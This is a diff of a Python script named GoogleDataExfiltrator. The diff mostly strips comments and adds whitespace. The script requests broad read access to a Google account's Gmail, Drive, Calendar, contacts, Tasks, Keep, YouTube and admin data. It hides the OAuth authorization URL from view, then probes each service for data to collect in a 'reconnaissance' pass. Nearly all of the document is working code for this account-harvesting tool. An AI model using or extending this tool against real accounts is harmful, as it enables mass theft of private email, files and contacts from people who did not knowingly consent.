@@ -1,7 +1,4 @@
-#!/usr/bin/env python3
-
 import os
-# Disable OAUTHLIB's scope checking - Google may add openid automatically
 os.environ['OAUTHLIB_RELAX_TOKEN_SCOPE'] = '1'
 
 import json
@@ -19,7 +16,6 @@ from googleapiclient.discovery import build
 from googleapiclient.http import MediaIoBaseDownload
 import io
 
-# Define OAuth 2.0 scopes for all Google services
 SCOPES = [
     'https://www.googleapis.com/auth/gmail.readonly',
     'https://www.googleapis.com/auth/drive.readonly',
@@ -41,9 +37,8 @@ class GoogleDataExfiltrator:
         self.output_dir = Path(output_dir)
         self.output_dir.mkdir(exist_ok=True)
         self.creds = None
-        self.services = {}
+        self.services = {}        
         
-        # Default limits to prevent indefinite execution
         self.limits = limits or {
             'gmail_messages': 100,
             'drive_files': 50,
@@ -80,17 +75,15 @@ class GoogleDataExfiltrator:
                     return False
                 
                 print("[*] Opening browser for authentication...")
-                import sys
-                
-                # Suppress the authorization URL output
+                import sys                
+               
                 old_stdout = sys.stdout
                 sys.stdout = io.StringIO()
                 
                 flow = InstalledAppFlow.from_client_secrets_file(
                     credentials_file, SCOPES)
-                self.creds = flow.run_local_server(port=0)
+                self.creds = flow.run_local_server(port=0)                
                 
-                # Restore stdout
                 sys.stdout = old_stdout
             
             with open(token_file, 'wb') as token:
@@ -107,18 +100,16 @@ class GoogleDataExfiltrator:
             self.services['calendar'] = build('calendar', 'v3', credentials=self.creds)
             self.services['people'] = build('people', 'v1', credentials=self.creds)
             self.services['tasks'] = build('tasks', 'v1', credentials=self.creds)
-            self.services['youtube'] = build('youtube', 'v3', credentials=self.creds)
+            self.services['youtube'] = build('youtube', 'v3', credentials=self.creds)            
             
-            # Try to initialize admin services (will fail for non-admin users)
             try:
                 self.services['admin_directory'] = build('admin', 'directory_v1', credentials=self.creds)
                 print("[+] All services initialized (including admin services)")
                 self.is_admin = True
             except Exception:
                 print("[+] All services initialized (admin services not available)")
-                self.is_admin = False
+                self.is_admin = False            
             
-            # Detect if this is a Workspace account
             try:
                 profile = self.services['gmail'].users().getProfile(userId='me').execute()
                 email = profile.get('emailAddress', '')
@@ -142,9 +133,8 @@ class GoogleDataExfiltrator:
         print("Probing account for active services...")
         print("="*60 + "\n")
         
-        active_services = {}
+        active_services = {}        
         
-        # Probe Gmail
         print("[*] Probing Gmail...", end=" ")
         try:
             profile = self.services['gmail'].users().getProfile(userId='me').execute()
@@ -162,9 +152,8 @@ class GoogleDataExfiltrator:
                 print("✗ Empty")
         except Exception as e:
             active_services['gmail'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Probe Google Drive
         print("[*] Probing Google Drive...", end=" ")
         try:
             results = self.services['drive'].files().list(pageSize=1).execute()
@@ -183,9 +172,8 @@ class GoogleDataExfiltrator:
                 print("✗ Empty")
         except Exception as e:
             active_services['drive'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Probe Shared Drives
         print("[*] Probing Shared Drives...", end=" ")
         try:
             shared_drives_results = self.services['drive'].drives().list(pageSize=10).execute()
@@ -202,9 +190,8 @@ class GoogleDataExfiltrator:
                 print("✗ None found")
         except Exception as e:
             active_services['shared_drives'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Probe Google Calendar
         print("[*] Probing Google Calendar...", end=" ")
         try:
             calendars_result = self.services['calendar'].calendarList().list().execute()
@@ -241,9 +228,8 @@ class GoogleDataExfiltrator:
                 print("✗ No calendars")
         except Exception as e:
             active_services['calendar'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Probe Google Contacts
         print("[*] Probing Google Contacts...", end=" ")
         try:
             results = self.services['people'].people().connections().list(
@@ -264,9 +250,8 @@ class GoogleDataExfiltrator:
                 print("✗ Empty")
         except Exception as e:
             active_services['contacts'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Probe Google Other Contacts
         print("[*] Probing Google Other Contacts...", end=" ")
         try:
             results = self.services['people'].otherContacts().list(
@@ -290,9 +275,8 @@ class GoogleDataExfiltrator:
                 print("✗ Empty")
         except Exception as e:
             active_services['other_contacts'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Probe Google Tasks
         print("[*] Probing Google Tasks...", end=" ")
         try:
             task_lists = self.services['tasks'].tasklists().list().execute()
@@ -322,9 +306,8 @@ class GoogleDataExfiltrator:
                 print("✗ No task lists")
         except Exception as e:
             active_services['tasks'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Probe Google Keep
         print("[*] Probing Google Keep...", end=" ")
         try:
             results = self.services['keep'].notes().list(pageSize=1).execute()
@@ -340,9 +323,8 @@ class GoogleDataExfiltrator:
                 print("✗ Empty")
         except Exception as e:
             active_services['keep'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Not available (likely requires Workspace)")
+            print(f"✗ Not available (likely requires Workspace)")        
         
-        # Probe YouTube
         print("[*] Probing YouTube...", end=" ")
         try:
             channel_results = self.services['youtube'].channels().list(
@@ -381,9 +363,8 @@ class GoogleDataExfiltrator:
                 print("✗ No channel")
         except Exception as e:
             active_services['youtube'] = {'active': False, 'reason': str(e)}
-            print(f"✗ Error: {e}")
+            print(f"✗ Error: {e}")        
         
-        # Summary
         print("\n" + "="*60)
         print("Reconnaissance Summary")
         print("="*60)
